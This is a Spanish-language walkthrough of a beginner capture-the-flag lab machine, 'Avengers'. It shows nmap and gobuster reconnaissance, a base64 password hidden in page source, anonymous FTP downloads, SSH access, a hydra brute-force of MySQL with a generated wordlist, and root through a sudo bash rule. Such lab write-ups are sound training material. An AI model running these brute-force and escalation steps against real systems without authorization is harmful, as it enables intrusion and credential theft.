---
description: '✍️ Autor: @diseo_ 🔍 Dificultad: Principiante'
---

# Avengers

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.68
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.68
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo, los puertos 21, 22, 80 y 3306 están abiertos. El **puerto 21** pertenece al servicio **FTP** (vsFTPd 3.0.5) y permite acceso anónimo. El puerto **22** está asociado con **SSH** (OpenSSH 8.9p1) para acceso remoto seguro. El **puerto 80** indica la presencia de un servidor **HTTP**, mientras que el **puerto 3306** corresponde a **MySQL**, lo que sugiere una base de datos en ejecución.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p21,22,80,3306 -v 192.168.1.68
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (70).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora exploramos el servicio **HTTP**. Se ingresó la dirección IP en el navegador, lo que llevó a que la página web sobre una página de Avengers y de hacking.

<figure><img src="../../.gitbook/assets/image (71).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (72).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos más directorios con la herramienta **Gobuster** a través de:&#x20;

```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,htm,php,txt,xml,js -u http://192.168.1.68
```

<figure><img src="../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

Tras esto accederemos a todos los directorios por si contienen información relevante.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 212538.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 212746.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 212843.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 213001.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 213142.png" alt=""><figcaption></figcaption></figure>

Al inspeccionar el código fuente de `database.html` contenía información relevante ya que había una contraseña en **base64**.&#x20;

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 213206.png" alt=""><figcaption></figcaption></figure>

Tras decodificarlo varias veces tuvimos el resultado de **fuerzabruta**.

<figure><img src="../../.gitbook/assets/image (74).png" alt=""><figcaption></figcaption></figure>

Por lo que probaré a meter eso en el buscador del principio.

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Hemos encontrado al usuario que se nos mencionaba en el comentario del código fuente llamado **Hulk**. Seguimos explorando el resto de servicios por lo que nos conectamos al servicio **FTP** a través del usuario **anonymous** y listamos el contenido y nos lo descargamos con los comandos.

```bash
get FLAG.txt
get credential_mysql.txt.zip
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2024-08-31 214903.png" alt=""><figcaption></figcaption></figure>

Revisamos el contenido de esos archivos. El fichero`.zip` lo dejamos ya que se nos requiere una contraseña.

<figure><img src="../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

Nos conectamos a través del servicio **SSH** con el usuario descubierto anteriormente y con su contraseña.

<figure><img src="../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Indagando entre las distintas carpetas descubrimos la manera de descomprimir el archivo `.zip` descargado anteriormente.

<figure><img src="../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

También descubrimos una flag.

<figure><img src="../../.gitbook/assets/image (81).png" alt=""><figcaption></figcaption></figure>

Descomprimimos la carpeta utilizando la contraseña que obtuvimos. Luego, generamos un diccionario que combine la palabra **fuerzabruta** con **4** caracteres adicionales.

<figure><img src="../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### &#x20;🚀 **EXPLOTACIÓN**

Generamos un diccionario para realizar fuerza bruta con **Hydra** posteriormente para entrar en la base de datos.

```bash
seq -w 0000 3000 | sed 's/^/fuerzabruta/' > diccionario.txt
```

```bash
hydra -l hulk -P diccionario.txt mysql://192.168.1.68
```

<figure><img src="../../.gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Nos conectamos a la base de datos **SQL** con las credenciales obtenidas.

```bash
mysql -h 192.168.1.68 -u hulk -p
```

Indagamos en la base de datos y descubrimos la contraseña del usuario **Stiff** por lo que nos conectaremos a él.

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

Observamos que podemos ejecutar una **bash** como **root** usamos eso para convertirnos en **root**.

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Hemos **completado con éxito** todas las etapas del proceso y **cumplido con todos los requisitos**.

¡Buena suerte con la búsqueda de las flags! Recuerda analizar cada detalle, examinar los archivos y servicios a fondo, y utilizar todas las herramientas a tu disposición para descubrirlas. ¡La clave está en la persistencia y en no dejar piedra sin mover! ¡Adelante, hacker! 💻🔍🚀
